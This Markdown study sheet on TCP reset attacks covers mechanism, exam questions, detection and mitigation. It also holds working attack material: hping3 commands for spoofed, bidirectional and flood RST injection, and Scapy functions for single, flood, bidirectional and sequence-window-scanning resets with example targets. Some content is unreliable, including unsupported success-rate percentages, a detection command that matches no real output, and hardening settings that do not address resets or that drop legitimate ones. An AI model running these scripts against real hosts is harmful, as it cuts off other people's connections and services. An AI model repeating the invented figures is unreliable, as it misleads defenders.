# RST Attack (TCP Reset Attack)

## üìç Attack Classification
- **Category**: Connection Disruption / Denial of Service
- **OSI Layer**: Layer 4 (Transport)
- **Protocol**: TCP
- **Port**: Any TCP port (commonly 80, 443, 22, 25, 53)

## üéØ Attack Mechanism
Exploits **TCP RST (Reset) packets** to forcibly terminate legitimate TCP connections by sending spoofed reset packets that appear to come from either endpoint of an established connection.

### How it Works:
1. **Connection Monitoring**: Attacker monitors active TCP connections
2. **Sequence Number Prediction**: Determines valid sequence numbers
3. **RST Injection**: Sends spoofed RST packets with correct parameters
4. **Connection Termination**: Both endpoints close the connection immediately

## üîç Key Characteristics
- **Immediate Termination**: RST packets force instant connection closure
- **Bidirectional Impact**: Can target either client or server side
- **Low Volume**: Requires minimal packets for maximum impact
- **Stateful Attack**: Needs connection state information

## üö® Exam Focus Points

### Critical Numbers:
- **TCP Sequence Window**: Must be within acceptable range (¬±65,536)
- **RST Flag**: 0x04 in TCP flags field
- **Window Size**: Usually 0 (not used in RST)
- **Payload**: RST packets carry no data
- **Success Rate**: 95%+ with accurate sequence numbers

### Common Exam Questions:
- **Q**: What happens when a TCP RST packet is received?
- **A**: The connection is immediately terminated without handshake
- **Q**: What information is needed for a successful RST attack?
- **A**: Source IP, destination IP, source port, destination port, and valid sequence number
- **Q**: How does RST differ from FIN?
- **A**: RST forces immediate closure; FIN initiates graceful closure handshake

### Attack Components:
- **Source IP Spoofing**: Impersonate connection endpoint
- **Port Accuracy**: Match exact source/destination ports
- **Sequence Number**: Within acceptable window range
- **Timing**: Send during active data transmission

## ‚ö° Attack Variations

### Connection Hijacking RST:
- **Method**: Monitor and reset specific connections
- **Impact**: Targeted connection disruption
- **Detection**: Hard to detect without deep inspection
- **Use Case**: Censorship, surveillance evasion

### Blind RST Attack:
- **Method**: Guess sequence numbers without monitoring
- **Impact**: Lower success rate but stealthier
- **Detection**: Requires statistical analysis
- **Technique**: Sequence number space scanning

### BGP RST Attack:
- **Method**: Target BGP sessions to disrupt routing
- **Impact**: Network-wide routing disruptions
- **Detection**: Network topology monitoring
- **Mitigation**: BGP session authentication

### SSH Connection Reset:
- **Method**: Target SSH sessions for access denial
- **Impact**: Remote administration disruption
- **Detection**: SSH log analysis
- **Prevention**: Connection encryption validation

## üõ°Ô∏è Detection & Mitigation
- **Network Protection**:
  - Deep packet inspection for RST patterns
  - Connection state validation
  - Sequence number randomization
  - RST rate limiting

- **Firewall Rules**:
  - Block unexpected RST packets
  - Validate RST packet legitimacy
  - Connection tracking correlation
  - Anomaly-based detection

### System Hardening:
```bash
# iptables RST attack protection
iptables -A INPUT -p tcp --tcp-flags RST RST -m limit --limit 5/sec --limit-burst 10 -j ACCEPT
iptables -A INPUT -p tcp --tcp-flags RST RST -j LOG --log-prefix "RST_Attack: "
iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP

# TCP hardening parameters
echo 1 > /proc/sys/net/ipv4/tcp_rfc1337
echo 2 > /proc/sys/net/ipv4/tcp_retries1
echo 15 > /proc/sys/net/ipv4/tcp_retries2
echo 3 > /proc/sys/net/ipv4/tcp_syn_retries

# Connection tracking optimization
echo 300 > /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_established
echo 120 > /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_time_wait
```

## üîß Attack Tools & Commands
- **hping3**: `hping3 -R -p 80 -s 12345 -M 1234567890 target`
- **Scapy**: Custom RST injection scripts
- **tcpkill**: `tcpkill -i eth0 host target_ip`
- **Netwox**: RST packet crafting
- **Ettercap**: Connection poisoning

### Manual Testing:
```bash
# Basic RST attack
hping3 -R -p 80 -s 12345 -M 1000000000 -c 1 target_ip

# RST flood attack
hping3 -R -p 80 --flood -M 1000000000 target_ip

# Targeted connection RST
hping3 -R -p 80 -s 443 -M $(tcpdump_seq_num) target_ip

# Bidirectional RST attack
hping3 -R -a client_ip -p 80 -s 12345 -M seq_num server_ip
hping3 -R -a server_ip -p 12345 -s 80 -M ack_num client_ip

# RST with window scanning
for seq in $(seq 1000000000 1000 1000100000); do
  hping3 -R -p 80 -s 12345 -M $seq -c 1 target_ip
done
```

## üí° Historical Context
- **1985**: TCP RST mechanism defined in RFC 793
- **Early 2000s**: RST attacks used for censorship (Great Firewall)
- **2004**: BGP RST attacks demonstrated
- **Modern Era**: Used in nation-state surveillance

## üìä RST Attack Effectiveness
| Target Type | Success Rate | Detection | Impact | Persistence |
|-------------|--------------|-----------|---------|-------------|
| HTTP Sessions | 85% | Medium | High | Low |
| SSH Connections | 90% | Low | Very High | Medium |
| BGP Sessions | 95% | Hard | Critical | High |
| Database Conns | 80% | Medium | High | Low |

## üéØ Target Selection
Preferred targets:
- **Long-lived connections** (SSH, databases, BGP)
- **Critical services** with connection persistence
- **Encrypted sessions** to force re-authentication
- **Administrative connections** for access denial
- **VPN tunnels** for connectivity disruption

## ‚ö†Ô∏è Vulnerable Configurations
- **No RST validation**: Accept all RST packets
- **Weak sequence randomization**: Predictable sequence numbers
- **No connection authentication**: Trust TCP layer alone
- **Default TCP settings**: No RST protection enabled

## üîç Detection Indicators
- **Unexpected connection terminations**
- **High RST packet rates from single sources**
- **Connections reset during active data transfer**
- **RST packets with suspicious sequence numbers**
- **Repeated connection establishment attempts**

### Detection Commands:
```bash
# Monitor RST packets
tcpdump -n 'tcp[tcpflags] & tcp-rst != 0'

# Count RST packets per source
tcpdump -n 'tcp[tcpflags] & tcp-rst != 0' | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c

# Monitor connection resets
ss -tuln | grep RESET | wc -l

# Application-specific monitoring
netstat -an | grep -E "(ESTABLISHED|CLOSE_WAIT)" | wc -l

# Log analysis for RST patterns
grep "RST" /var/log/syslog | tail -20
```

## üåê Network Impact
- **Bandwidth**: Minimal (single packets)
- **Service Availability**: High impact on connection-dependent services
- **User Experience**: Sudden disconnections and timeouts
- **System Resources**: Low direct impact, high operational impact

## üí° Defense Strategy
1. **Sequence Validation**: Implement strict sequence number checking
2. **Connection Authentication**: Use application-layer authentication
3. **RST Rate Limiting**: Control RST packet acceptance rates
4. **Deep Inspection**: Analyze RST packet legitimacy
5. **Connection Monitoring**: Track unexpected terminations

## üîß Verification Commands
```bash
# Test RST handling
hping3 -R -p 80 -c 1 target_ip

# Verify sequence window protection
nmap --scanflags RST -p 80 target_ip

# Check connection resilience
curl -m 10 http://target_ip &
PID=$!; sleep 2; hping3 -R -p 80 -c 5 target_ip; wait $PID

# Monitor connection states
watch 'cat /proc/net/tcp | cut -d: -f2 | cut -d" " -f2 | sort | uniq -c'

# Application response testing
ab -n 100 -c 10 http://target_ip/ | grep "Failed requests"
```

## üìà Attack Metrics
- **Packet Rate**: 1-100 packets/sec (typically low volume)
- **Success Rate**: 60-95% (depends on sequence accuracy)
- **Impact Duration**: Immediate (connection termination)
- **Recovery Time**: 1-30 seconds (reconnection time)

## üîÑ Advanced Evasion
- **Sequence Number Prediction**: Use statistical analysis
- **Timing Correlation**: Send RST during data transmission
- **Source Spoofing**: Rotate source addresses
- **Multi-vector**: Combine with other TCP attacks
- **Protocol Tunneling**: Hide RST within legitimate traffic

## üî¨ Attack Analysis
### Scapy Script Examples:
```python
from scapy.all import *
import random
import time

def rst_attack_single(target_ip, target_port, src_ip, src_port, seq_num):
    """Single RST packet attack"""
    rst_packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=src_port, dport=target_port, 
                     flags="R", seq=seq_num)
    send(rst_packet, verbose=0)

def rst_flood(target_ip, target_port, duration=60):
    """RST flood with random parameters"""
    end_time = time.time() + duration
    while time.time() < end_time:
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(1, 4294967295)
        
        rst_packet = IP(src=src_ip, dst=target_ip) / \
                     TCP(sport=src_port, dport=target_port,
                         flags="R", seq=seq_num)
        send(rst_packet, verbose=0)
        time.sleep(0.01)

def bidirectional_rst(client_ip, server_ip, client_port, server_port, 
                     client_seq, server_seq):
    """Bidirectional RST attack"""
    # Reset from server perspective
    rst1 = IP(src=server_ip, dst=client_ip) / \
           TCP(sport=server_port, dport=client_port,
               flags="R", seq=server_seq)
    
    # Reset from client perspective  
    rst2 = IP(src=client_ip, dst=server_ip) / \
           TCP(sport=client_port, dport=server_port,
               flags="R", seq=client_seq)
    
    send([rst1, rst2], verbose=0)

def sequence_window_scan(target_ip, target_port, base_seq, window_size=65536):
    """Scan sequence number window for valid RST"""
    for offset in range(0, window_size, 1000):
        seq_num = base_seq + offset
        rst_packet = IP(dst=target_ip) / \
                     TCP(dport=target_port, flags="R", seq=seq_num)
        send(rst_packet, verbose=0)
        time.sleep(0.001)

# Usage examples
# rst_attack_single("192.168.1.100", 80, "192.168.1.50", 12345, 1000000000)
# rst_flood("192.168.1.100", 80, 30)
# bidirectional_rst("192.168.1.50", "192.168.1.100", 12345, 80, 1000000000, 2000000000)
# sequence_window_scan("192.168.1.100", 80, 1000000000)
```

## üõ†Ô∏è Mitigation Best Practices
- **TCP RST Validation**: Verify RST packet legitimacy
- **Sequence Number Randomization**: Use cryptographically secure randomization
- **Connection Monitoring**: Track unexpected terminations
- **Application-Layer Protection**: Implement connection recovery
- **Network Segmentation**: Isolate critical connections
- **Intrusion Detection**: Deploy RST attack signatures

## üîç Forensic Analysis
- **Connection Logs**: Analyze sudden termination patterns
- **Packet Captures**: Examine RST packet timing and sources
- **Network Flow Data**: Identify RST packet origins
- **Application Logs**: Correlate with connection errors
- **System Metrics**: Monitor connection establishment rates

## üìã Response Checklist
1. **Immediate**: Block suspicious RST sources
2. **Short-term**: Enable RST packet logging and monitoring
3. **Medium-term**: Implement connection authentication
4. **Long-term**: Deploy advanced TCP protection mechanisms
5. **Continuous**: Monitor for RST attack pattern evolution
